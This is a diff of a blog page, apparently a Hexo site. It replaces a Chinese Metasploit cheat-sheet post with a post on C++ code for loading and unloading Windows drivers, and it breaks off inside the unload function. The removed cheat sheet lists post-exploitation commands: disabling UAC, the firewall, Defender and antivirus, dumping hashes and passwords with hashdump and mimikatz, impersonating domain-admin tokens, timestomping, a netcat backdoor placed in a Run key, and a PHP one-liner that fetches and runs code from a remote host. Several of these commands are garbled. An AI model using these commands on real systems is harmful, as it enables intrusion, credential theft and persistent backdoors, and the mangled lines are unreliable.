@@ -206,7 +206,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="en">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/06/03/Msf/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/09/21/SYSManger/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/Image.JPG">
@@ -220,7 +220,7 @@
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
           
-            <a href="/2020/06/03/Msf/" class="post-title-link" itemprop="url">Msf</a>
+            <a href="/2020/09/21/SYSManger/" class="post-title-link" itemprop="url">SYSManger</a>
         </h1>
 
         <div class="post-meta">
@@ -229,24 +229,18 @@
                 <i class="fa fa-calendar-o"></i>
               </span>
               <span class="post-meta-item-text">Posted on</span>
+              
 
-              <time title="Created: 2020-06-03 09:10:54" itemprop="dateCreated datePublished" datetime="2020-06-03T09:10:54+08:00">2020-06-03</time>
+              <time title="Created: 2020-09-21 10:38:58 / Modified: 10:57:26" itemprop="dateCreated datePublished" datetime="2020-09-21T10:38:58+08:00">2020-09-21</time>
             </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2020-06-09 13:42:06" itemprop="dateModified" datetime="2020-06-09T13:42:06+08:00">2020-06-09</time>
-              </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
                 <i class="fa fa-folder-o"></i>
               </span>
               <span class="post-meta-item-text">In</span>
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" itemprop="url" rel="index">
-                    <span itemprop="name">渗透测试</span>
+                  <a href="/categories/%E9%A9%B1%E5%8A%A8%E5%BC%80%E5%8F%91/" itemprop="url" rel="index">
+                    <span itemprop="name">驱动开发</span>
                   </a>
                 </span>
             </span>
@@ -262,343 +256,17 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <h1 id="MSF"><a href="#MSF" class="headerlink" title="MSF"></a>MSF</h1><h2 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h2><ol>
-<li>Single:只有一段代码的payload</li>
-<li>Stages: 只用来网络连接，比较小</li>
-<li>Stager:  下载目的payload，比较小</li>
-</ol>
-<h2 id="Auxiliary"><a href="#Auxiliary" class="headerlink" title="Auxiliary"></a>Auxiliary</h2><p>用来扫描，信息收集，枚举指纹探测。</p>
-<h2 id="encoders"><a href="#encoders" class="headerlink" title="encoders"></a>encoders</h2><p>主要对payload加密，防查杀</p>
-<h2 id="Nops"><a href="#Nops" class="headerlink" title="Nops"></a>Nops</h2><p>提高payload的稳定性和大小。</p>
-<h2 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h2><p>用来漏洞利用。</p>
-<h2 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h2><ol>
-<li>msfupdate更新msf</li>
-<li>help 查看帮助，后面可以加上指定的命令</li>
-<li>exit 退出</li>
-<li>msfconsole的-r参数可以指定一个资源脚本文件</li>
-<li>banner 查看banner信息</li>
-<li>connect 类似于msf的nc</li>
-<li>show XXX 查看模块的可用状态，在具体模块里面也是可以使用show命令</li>
-<li>search xxx 搜索模块<ol>
-<li>name：搜索名称包含的</li>
-<li>platform:搜索平台</li>
-<li>cve:搜索cve</li>
-</ol>
-</li>
-<li>use 进入某个模块<ol>
-<li>在use下面的：</li>
-<li>info查看信息</li>
-<li>show options 查看参数</li>
-<li>show target 展示目标</li>
-<li>show payloads 展示适用于当前漏洞的payload</li>
-<li>check 只是检测一下（大部分没有）</li>
-<li>back 返回上一层</li>
-<li>set 设置值<ol>
-<li>target 设置目标系统</li>
-<li>payloads 设置payload</li>
-</ol>
-</li>
-</ol>
-</li>
-<li>db_<ol>
-<li>db_status,查看连接状态</li>
-<li>db_nmap 使用namp扫描，将信息保存下来</li>
-<li>hosts 查看nmap扫描的结果 -s 查找 -c 查看列</li>
-</ol>
-</li>
-<li>creds 查看报出来的密码</li>
-<li>vlun 查看密码</li>
-<li>setg 全局设置（只能在当前会话中有用，除非你要save了）</li>
-<li>run/exploit 执行当前模块<ol>
-<li>-j 参数后台方式执行</li>
-<li>分为Activity和Passive</li>
-</ol>
-</li>
-<li>jobs 查看当前的任务</li>
-<li>sessions 查看当前的shell连接<ol>
-<li>-i 进入session 后面指定session 编号</li>
-</ol>
-</li>
-<li>load<ol>
-<li>加载插件，例如load openvas</li>
-<li>unload nessus 取消加载插件</li>
-</ol>
-</li>
-<li>loadpath 加载自己写的插件</li>
-<li>route 通过指定session路由（通过得到的session入侵内网）</li>
-<li>irb：开发的接口</li>
-<li>resource 加载资源文件</li>
-<li>payload也是可以单独使用，然后使用generate生成一个payload，<ol>
-<li>-b 指定坏字符，msf会智能选择encode</li>
-<li>-e 指定encode</li>
-<li>-i 编码次数</li>
-<li>-k 新的进程</li>
-<li>-x 新的模板</li>
-<li>-t 输出类型</li>
-<li>-f 输出文件</li>
-<li>-s 加指定个数的nop</li>
-</ol>
-</li>
-<li>Meterpreter是比较高级的shell<ol>
-<li>help 查看命令</li>
-<li>background 返回上一级</li>
-<li>pwd 查看目录</li>
-<li>dir和ls都是查看目录</li>
-<li>cat 查看文件</li>
-<li>mkdir 创建目录</li>
-<li>rmdir 删除目录</li>
-<li>mv,rm 移动，删除</li>
-<li>edit 编辑（类似于vi）</li>
-<li>lpwd 当前我们msf的目录</li>
-<li>lcd 移动msf执行的目录</li>
-<li>run 执行命令</li>
-<li>bgrun 后台命令<ol>
-<li>tab查看支持的一些命令</li>
-<li>通过bgrun XXX执行就可以了</li>
-</ol>
-</li>
-<li>clearev清除日志</li>
-<li>download 下载到lpwd的目录下</li>
-<li>upload 上传（Windows下的目录需要注意需要两个\，防止转义）</li>
-<li>execute -f 命令 -i -h（执行命令） -i 交互 -h 隐藏</li>
-<li>ps查看进程</li>
-<li>getuid 查看当前的账号</li>
-<li>gesystem 强制转换为system</li>
-<li>getprivs 查看权限</li>
-<li>getproxy 获取代理</li>
-<li>getpid 查看注入的进程</li>
-<li>migrate 迁移进程 migrate pid</li>
-<li>hashdump dump下来hash值</li>
-<li>sysinfo 查看系统信息</li>
-<li>kill 杀死进程</li>
-<li>shell 获取操作系统的shell</li>
-<li>show_mount 查看分区</li>
-<li><code>search -f win.ini</code> 查找文件</li>
-<li>netstat 查看开放的端口和连接</li>
-<li>arp 查看缓存</li>
-<li>route 查看路由表</li>
-<li>ldletime 查看空闲时间</li>
-<li>resource 调用资源文件（就是一些指令）</li>
-<li>record_mic 记录麦克风</li>
-<li>webcam_list 列举摄像头</li>
-<li>web_snap -i 1 -v false 查看摄像头</li>
-<li>python_execute “” 执行原生的python代码（无需环境）</li>
-<li>我们需要先load python 进来</li>
-<li><code>python_import -f xxx.py</code> 导入py代码</li>
-<li>msfconsole -x “” 一条命令执行</li>
-</ol>
-</li>
-<li>MSF的扫描<ol>
-<li>使用内置的nmap：<code>db_nmap 192.168.209.1</code></li>
-<li>auxilary模块的使用方法和exploit模块的使用方法类似</li>
-<li>有的时候我们需要提供session（通过background返回去）</li>
-<li>如果提示Known bug in WMI query, try migrating to another process 迁移到另一个进程再次尝试</li>
-<li>小知识：mssql端口号可能不是1433，他可能是个随机的数，我们可以通过1434这个端口查询出真是的端口号。</li>
-</ol>
-</li>
-<li>WMAP插件（自动扫描msf中的http模块）<ol>
-<li>load wmap</li>
-<li><code>wmap_sites -a http://192.168.209.1</code></li>
-<li>-l 查看任务列表</li>
-<li><code>wmap_targets -t http://192.168.209.1/test</code></li>
-<li><code>wmap_run -e</code>执行</li>
-</ol>
-</li>
-<li>和扫描器配合<ol>
-<li>openvas/nessus/nessus<ol>
-<li>使用load openvas<ol>
-<li>使用方法比较简单，-h看看就知道了，这里不记录了</li>
-</ol>
-</li>
-<li>使用openvas/nessus导出的nbe文件（db_import）</li>
-</ol>
-</li>
-</ol>
-</li>
-<li>客户端漏洞<ol>
-<li>使用存在漏洞的客户端进行入侵<ol>
-<li>例如使用低版本的IE访问某些页面就会被入侵</li>
-<li>使用存在漏洞的pdf阅读器会被入侵，msf支持生成含有payload的pdf</li>
-<li>通过flash进行入侵</li>
-<li>brewser_autopwn2这个模块集成了好用的浏览器漏洞模块，一运行相当于测试了好多的模块</li>
-<li>jre也是可能存在漏洞</li>
-<li>安卓中也是payload在msf有的。</li>
-<li>office中的宏插入vbs感染计算机。</li>
-</ol>
-</li>
-</ol>
-</li>
-<li>拥有shell之后进行后渗透测试阶段的操作<ol>
-<li>Meterpreter的shell</li>
-<li>load priv 加载提权插件</li>
-<li>getsystem提权提权，如果不行的话呢很可能是UAC的访问控制</li>
-<li>local目录下的模块是提权用的</li>
-<li>ask模块是用来得到UAC允许的<ol>
-<li>set payload xxx(与之前一样的payload)</li>
-<li>set filename xxx 设置一个文件名称</li>
-<li>然后set session id 设置拿来的session</li>
-<li>exploit之后会得到一个经过UAC访问控制的session，之后我们就可以getsystem</li>
-</ol>
-</li>
-<li>bypassuac模块<ol>
-<li>set session id 设置一个Session</li>
-<li>set payload xxx和上面一个一样，有一些别的没记录，看一下就知道了。</li>
-<li>这个模块就不会用来用户确定UAC权限的了。</li>
-<li>也是可以获得UAC允许的session</li>
-</ol>
-</li>
-<li>bypassuac_injection模块<ol>
-<li>这个是通过DLL注入进去的，操作的话呢还是差不多的。</li>
-</ol>
-</li>
-<li>通过漏洞进行账号的提权<ol>
-<li>13_053/13_081/13_097/ppr_flatten_tcp（一些杂项没有写）<ol>
-<li>set payload</li>
-<li>set session id </li>
-<li>exploit</li>
-<li>这个时候会利用漏洞提升权限</li>
-</ol>
-</li>
-</ol>
-</li>
-<li>vncinject这个payload是图形化的VNCshell<ol>
-<li>ViewOnly这个参数改为no的话呢，你就可以进行操作了</li>
-<li>这个payload不是所有多可以使用的</li>
-</ol>
-</li>
-<li>关闭UAC<ol>
-<li><pre><code>cmd.exe /k %windir%\System32\reg.exe ADD
-HKLMSOF TWAREMicrosoft\Windows\CurrentVersion\Policies\System N
-EnableLUA /t REG DWORD /d0 /f
-cmd.exe /k %windir%\System32\reg.exe ADD
-HKLM\SOFTWAREMicrosoft\Windows\CurrentVersion\Policies\system /N
-LocalAccountTokenFilterPolicy /t REG DWORD/d1 f
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">	2. 然后重启计算机</span><br><span class="line">11. 关闭防火墙：需要管理员或system权限 &#96;netsh advfirewall set allprofiles state off&#96;</span><br><span class="line">12. 关闭Windefend：&#96;net stop windefend&#96;</span><br><span class="line">13. Bitlocker 操盘加密：&#96;manage-bde -off C&#96;关闭C盘加密&#96;manage-bde -status C&#96;查看C盘加密状态</span><br><span class="line">14. 关闭DEP：&#96;bcdedit.exe &#x2F;set &#123;current&#125; nxAlwaysOff&#96;</span><br><span class="line">15. 在Meterpreter中使用run killav关闭常见的杀毒软件或者&#96;run post&#x2F;windows&#x2F;manage&#x2F;killav&#96;</span><br><span class="line">16.</span><br></pre></td></tr></table></figure>
-开启远程桌面服务
-run post/windows/manage/enable. rdp
-第二种方法
-run getgui -e
-run getgui -u yuanfh -p pass
-run multi console. command -rC clean up 201 60824.1855.rc
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">17. 让看远程桌面：&#96;screenshot&#96;</span><br><span class="line">18. &#96;use espia&#96; 然后 &#96;screengraby&#96;</span><br><span class="line">19. Token：</span><br><span class="line">	1. 分类：</span><br><span class="line">		1. 交互的Token（3389之类的）</span><br><span class="line">		2. 非交互的Token（smb文件共享之类的）</span><br><span class="line">	2. 注销的交互token会变成非交互的token，权限并没有改变</span><br><span class="line">	3. 通过域管理员遗留的token，我们利用，然后进行管理</span><br><span class="line">	4. load incognito    加载这个插件</span><br><span class="line">	5. list token 列举token（需要域管理员访问过我们）</span><br><span class="line">	6. impersonate_token LAB\\administrator   (\\是取消转义\，后面的是我们通过列举token得到的名称)</span><br><span class="line">	7. 然后我们就获取到了域管理权限</span><br><span class="line">	8. &#96;execute -f cmd.exe -i -t&#96; -t 使用我们的token，-i是交互，-f是命令</span><br><span class="line">	9. 然后我们就有域管理员的的权限</span><br><span class="line">	10. 使用本机的漏洞进行提权：ms_10_015，通过已有的session通过遗留的token进行提权</span><br><span class="line">20. 添加注册表(添加nc自动启动)：</span><br></pre></td></tr></table></figure>
-upload /usr/share/windows binaries/nc.exe C:l\windows\\system32 
-reg enumkey -k HKLM\softwarel\microsoft\windowsl\currentversion\run
-reg setval -k HKLM\softwarel\microsoft\windows\\currentversion\\run -V nc -d &apos;C:\windows\system32\nc.exe -Ldp 444 -e cmd.exe&apos;
-reg queryval -k HKLM\softwarel\microsoft\windows\\currentversion\\Run -V nc</code></pre></li>
-</ol>
-</li>
-<li>开启防火墙策略：<code>netsh firewall add portopening TCP 444 &quot;test&quot; ENABLE ALL</code></li>
-<li>抓包：使用meterpreter的命令<ol>
-<li>使用命令：<code>sniffer_start 1</code>选择抓包的网卡编号，可以通过：<code>sniffer_interfaces</code>进行获取</li>
-<li>使用：<code>sniffer_dump 1 1.cap</code>进行dump我们的数据包</li>
-<li>需要注意的是我们抓包的缓冲区是有限的，所以我们要及时dump</li>
-<li>这个智能的是不会抓取Meterpreter自己发送的数据包</li>
-<li>psnuffle这个是对之前的cap文件进行分析，但是还是wireshark会比较好一些</li>
-</ol>
-</li>
-<li>文件搜索<ol>
-<li><code>search d- c:\\ -f *.ini</code></li>
-</ol>
-</li>
-<li>密码破解<ol>
-<li>首先我嗯需要通过Meterpreter获取到hash</li>
-<li>然后我们使用：<code>use post/windows/gather/hashdump</code></li>
-<li>然后设置我们的session</li>
-<li>然后exploit就可以了，几句可以获得hash了</li>
-<li>然后我们使用：<code>auxilary/analyze/jtr_crack_fast</code></li>
-<li>直接run就好了</li>
-<li>这个只是判断一些简单的密码时候否和我hash相匹配</li>
-</ol>
-</li>
-<li>文件的MAC时间（Modified【修改文件内容】 / Accessed【访问时间】 / Changed【权限时间修改】）<ol>
-<li><code>touch -d &quot;5 days ago&quot; 1.txt</code>将访问的时间修改文件的时间提前五天，-t 是直接修改时间戳</li>
-<li><code>stat 1.txt</code>查看MAC时间状态</li>
-<li>Meterpreter实现修改时间<ol>
-<li><code>timestomp -v 1.txt</code> （MACE的E 是文件扇区数据修改时间）</li>
-<li>-z（-m -a -c -e） 指定时间</li>
-<li>-b 设置时间改为空</li>
-<li>-r 是递归</li>
-</ol>
-</li>
-</ol>
-</li>
-<li>Pivoting 跳板<ol>
-<li><code>run autoroute -s 1.1.1.10/24</code>进行路由转发</li>
-<li>使用protfwd：<ol>
-<li><code>portwfwd -add -L 1.1.1.0-l 3389 -r 2.1.1.11 -p 3389</code>将自己的3389和<code>2.1.1.11</code>中间做了隧道</li>
-</ol>
-</li>
-</ol>
-</li>
-<li>handler模块中的<code>exitonsession</code>设置为false的话呢是接收到session的话呢是不会退出的。<ol>
-<li><code>set AutoRunScript migrate -n explore.exe</code>这段命令是session一来自动转移</li>
-</ol>
-</li>
-<li>POST模块<ol>
-<li>扩大战果的模块</li>
-<li><code>run post/windwos/gather/credentials/credential_colltor</code></li>
-<li>post的模块大部分都是这样子的扫描查看信息的，在我们的session中</li>
-<li><code>run post/multi/recon/local exploit_ suggester</code><ol>
-<li>自动帮我们侦查本地提权的漏洞（多个）</li>
-</ol>
-</li>
-<li><code>set AutoRunScript post/windows/gather/dumplist</code> 自动执行查看用户最近使用文档（这个需要我们先转移用户）</li>
-<li>InitalAuotoRunScript 在AutoRunScript执行之前运行</li>
-<li>Meterpreter中：<code>set hostsedit -e 1.1.1.1,www.baidu.com</code>修改host，会自动清除缓存（缓存相对host优先级高）<ol>
-<li><code>run winenum</code>查看Windows的信息（可能需要高权限）</li>
-</ol>
-</li>
-</ol>
-</li>
-<li>持久shell<ol>
-<li><code>run metsvc -A</code>(这个会写文件，安装一个服务)</li>
-<li><code>use exploit/multi/handler</code></li>
-<li><code>set payload windwos/metsvc_bind_tcp</code></li>
-<li><code>set rhost 192.168.209.129</code></li>
-<li><code>set lport 3333</code></li>
-<li>这种相对不好用，下面的好用</li>
-<li><code>run persistence -X -r 192.168.209.129 -p 4444 -i 10</code> 下次重启自动启动，延迟10s启动</li>
-</ol>
-</li>
-<li><code>Mimikatz</code><ol>
-<li><code>load mimikatz</code></li>
-<li><code>msv</code> 查看用户信息</li>
-<li><code>kerberos</code> 读取内存中的登录密码</li>
-<li><code>mimikatz_command -f modulename</code></li>
-</ol>
-</li>
-<li>还可以使用PHP脚本生成的shell反弹连接msf<ol>
-<li>在handler中使用和之前一样的使用payload：php/meterpreter/reverse_tcp</li>
-</ol>
-</li>
-<li>Web Delivery<ol>
-<li>代码执行漏洞的利用</li>
-<li><code>use exploit/multi/script/web_deliery</code></li>
-<li>set tagert PHP（php,python…）</li>
-<li>payload:php/meterpreter/reverse_tcp</li>
-<li>然后我们会生成一个php命令，目标有代码执行，我们就让他执行</li>
-<li>命令类似于：<code>php -d allow url fopen=true -r &quot;eval(file get_ contents( &#39;http://192.168.21.90: 8080/&#39;));&quot;</code></li>
-<li>然后就会反弹连接我们的msf</li>
-</ol>
-</li>
-<li>可以使用hidden的绑定<ol>
-<li>就是只有我们连接了才会开放端口，我们不连接的话呢是不会开启的</li>
-</ol>
-</li>
-<li>armitage中的find attack之寻找可用的端口对应的模块，hail是全部检测下。</li>
-<li>社会工程学<ol>
-<li>setooklit</li>
-<li>使用社会工程学攻击</li>
-<li>Wbesit attack vectors</li>
-<li>选择身份验证的攻击</li>
-<li>这个会克隆一个URL，然后接受表单</li>
-<li>写到本机上面，最后跳转到真正的页面</li>
-<li>还可以通过邮箱进行攻击</li>
-</ol>
-</li>
-</ol>
-</li>
-</ol>
+          <h1 id="驱动管理器"><a href="#驱动管理器" class="headerlink" title="驱动管理器"></a>驱动管理器</h1><p>相对于之前使用net于sc命令进行操作的命令行工具，完全可以自己进行编写一个小软件进行自动化的测试。</p>
+<h2 id="加载函数"><a href="#加载函数" class="headerlink" title="加载函数"></a>加载函数</h2><p>首先我们需要编写加载驱动以及卸载驱动的函数。</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/************************************************************************/</span></span><br><span class="line"><span class="comment">/* 用来加载驱动程序												         */</span></span><br><span class="line"><span class="comment">/************************************************************************/</span></span><br><span class="line"><span class="function">BOOL <span class="title">LoadNTDriver</span><span class="params">(<span class="keyword">char</span>* lpszDreverName,<span class="keyword">char</span> * lpszDriverPath)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> szDriverImagePath[<span class="number">256</span>];</span><br><span class="line">	GetFullPathName(lpszDriverPath,<span class="number">256</span>,szDriverImagePath,<span class="literal">NULL</span>);</span><br><span class="line">	BOOL bRet = FALSE;</span><br><span class="line">	SC_HANDLE hServiceMgr = <span class="literal">NULL</span>;<span class="comment">//scm管理器的句柄</span></span><br><span class="line">	SC_HANDLE hServiceDDK = <span class="literal">NULL</span>;<span class="comment">//NT驱动的服务句柄</span></span><br><span class="line">	hServiceMgr = OpenSCManager(<span class="literal">NULL</span>,<span class="literal">NULL</span>,SC_MANAGER_ALL_ACCESS);</span><br><span class="line">	<span class="keyword">if</span> (hServiceMgr == <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"OpenSCManger() Faild %d\n"</span>,GetLastError());</span><br><span class="line">		<span class="keyword">goto</span> BeforeLeave;</span><br><span class="line">	&#125; </span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"OpenSCManger() OK\n"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	hServiceDDK = CreateService(hServiceMgr,lpszDreverName,lpszDreverName,SC_MANAGER_ALL_ACCESS,SERVICE_KERNEL_DRIVER,SERVICE_DEMAND_START</span><br><span class="line">		,SERVICE_ERROR_IGNORE,szDriverImagePath,<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	DWORD dwRtn;</span><br><span class="line">	<span class="keyword">if</span> (hServiceDDK == <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		dwRtn = GetLastError();</span><br><span class="line">		<span class="keyword">if</span> (dwRtn != ERROR_IO_PENDING &amp;&amp; dwRtn != ERROR_SERVICE_EXISTS)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">"CreateService失败,错误号:%d\n"</span>,dwRtn);</span><br><span class="line">			<span class="keyword">goto</span> BeforeLeave;</span><br><span class="line">		&#125; </span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">"服务之前已经创建过了,正在打开之前的服务！\n"</span>);</span><br><span class="line">			hServiceDDK = OpenService(hServiceMgr,lpszDreverName,SERVICE_ALL_ACCESS);</span><br><span class="line">			<span class="keyword">if</span> (hServiceDDK == <span class="literal">NULL</span>)</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">"打开服务出错 错误码：%d"</span>,GetLastError());</span><br><span class="line">				<span class="keyword">goto</span> BeforeLeave;</span><br><span class="line">			&#125; </span><br><span class="line">			<span class="keyword">else</span></span><br><span class="line">			&#123;</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">"打开服务成功"</span>);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"CreateService OK\n"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	bRet = StartService(hServiceDDK,<span class="literal">NULL</span>,<span class="literal">NULL</span>);</span><br><span class="line">	<span class="keyword">if</span> (!bRet)</span><br><span class="line">	&#123;</span><br><span class="line">		DWORD dwRtn = GetLastError();</span><br><span class="line">		<span class="keyword">if</span> (dwRtn != ERROR_IO_PENDING &amp;&amp; dwRtn != ERROR_SERVICE_ALREADY_RUNNING)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">"StartService faild %d"</span>,dwRtn);</span><br><span class="line">			bRet = FALSE;</span><br><span class="line">			<span class="keyword">goto</span> BeforeLeave;</span><br><span class="line">		&#125; </span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> (dwRtn == ERROR_IO_PENDING)</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="comment">//设备被挂起</span></span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">"设备已经被挂起"</span>);</span><br><span class="line">				bRet = FALSE;</span><br><span class="line">				<span class="keyword">goto</span> BeforeLeave;</span><br><span class="line">			&#125; </span><br><span class="line">			<span class="keyword">else</span></span><br><span class="line">			&#123;</span><br><span class="line">				<span class="comment">//服务已经启动了</span></span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">"服务之前已经启动了！ ERROR_SERVICE_ALREADY_RUNNING"</span>);</span><br><span class="line">				bRet = TRUE;</span><br><span class="line">				<span class="keyword">goto</span> BeforeLeave;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	bRet = TRUE;</span><br><span class="line">BeforeLeave:</span><br><span class="line">	<span class="keyword">if</span> (hServiceMgr)</span><br><span class="line">		CloseServiceHandle(hServiceMgr);</span><br><span class="line">	<span class="keyword">if</span>(hServiceDDK)</span><br><span class="line">		CloseServiceHandle(hServiceDDK);</span><br><span class="line">	<span class="keyword">return</span> bRet;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>其实代码阅读起来很简单，首先就是我们获取文件的完整路径，然后我们打开SC的句柄（判断性质的就不记录了），接着我们创建服务，创建服务的时候我们需要用到我们之前得到的SC句柄，创建失败的话呢我们判断是否是之前的服务，如果是就打开。我们接下来启动服务，然后就是简单的判断，需要注意的是，这里用到了很老的goto语句。</p>
+<h2 id="卸载函数"><a href="#卸载函数" class="headerlink" title="卸载函数"></a>卸载函数</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">/************************************************************************/</span></span><br><span class="line"><span class="comment">/* 用来卸载驱动                                                                     */</span></span><br><span class="line"><span class="comment">/************************************************************************/</span></span><br><span class="line"><span class="function">BOOL <span class="title">UnLoadNTDriver</span><span class="params">(<span class="keyword">char</span> * szSvrName)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	BOOL bRet = FALSE;</span><br><span class="line">	SC_HANDLE hServiceMgr = <span class="literal">NULL</span>;<span class="comment">//scm管理器的句柄</span></span><br><span class="line">	SC_HANDLE hServiceDDK = <span class="literal">NULL</span>;<span class="comment">//NT驱动的服务句柄</span></span><br><span class="line">	SERVICE_STATUS SvrSta; </span><br><span class="line">	hServiceMgr  = OpenSCManager(<span class="literal">NULL</span>,<span class="literal">NULL</span>,SC_MANAGER_ALL_ACCESS);</span><br><span class="line">	<span class="keyword">if</span>(hServiceMgr == <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">//打开SCM管理器</span></span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"OpenSCManager失败：%d\n"</span>,GetLastError());</span><br><span class="line">		bRet = FALSE;</span><br><span class="line">		<span class="keyword">goto</span> BeforeLeave;</span><br><span class="line">	&#125;<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"OpenSCManager成功\n"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span 